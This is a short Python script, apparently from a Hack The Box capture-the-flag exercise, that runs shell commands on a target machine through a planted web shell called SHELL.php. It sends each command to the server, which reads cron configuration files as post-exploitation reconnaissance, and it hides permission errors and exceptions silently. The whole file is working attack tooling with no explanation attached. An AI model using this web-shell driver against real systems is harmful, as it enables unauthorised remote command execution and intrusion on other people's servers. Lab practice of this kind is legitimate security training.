import urllib.request, urllib.parse

cmds = [
    "cat /etc/cron.d/php 2>&1",
    "cat /etc/cron.d/sysstat 2>&1",
    "cat /etc/cron.d/e2scrub_all 2>&1",
]

for cmd in cmds:
    url = "http://10.129.26.34/files/SHELL.php?" + urllib.parse.urlencode({"c": cmd})
    headers = {"Host": "support_001.enigma.htb"}
    req = urllib.request.Request(url, headers=headers)
    try:
        resp = urllib.request.urlopen(req, timeout=10)
        result = resp.read().decode("utf-8", errors="replace").strip()
        if result and "Permission denied" not in result:
            print(f"=== {cmd[:60]} ===")
            print(result[:1000])
            print()
    except Exception as e:
        pass
